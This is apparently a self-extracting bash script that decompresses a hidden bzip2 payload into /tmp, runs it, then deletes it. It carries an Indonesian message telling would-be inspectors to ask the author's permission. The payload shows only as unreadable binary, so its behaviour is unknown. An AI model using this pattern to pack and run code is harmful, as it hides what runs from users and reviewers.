#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�M��  5_�@|c�2&�����0,�H&��4i�i4bhi���@&�4І��� @�M&���F�i�dh���`b���B��FlP�%9�|� ?��(D�G!�i$��-��f9u�R��ȫ1��v_�PI�|�
��b,]�Sv8�'��+9�T�\䑋P-��b�^ޗ 	�-4�6��F'�єC1�c�]̯�\��K'P]x��B�����#T��y  �Bo`1����SXM�VG�-J�H��_R��Ws�e�ŤF� ��[Z&�v�U�B:�lX�	"s��`�" ��<�K$��Ҟ�c�所��UD�a.�S�P���.�p�!�wh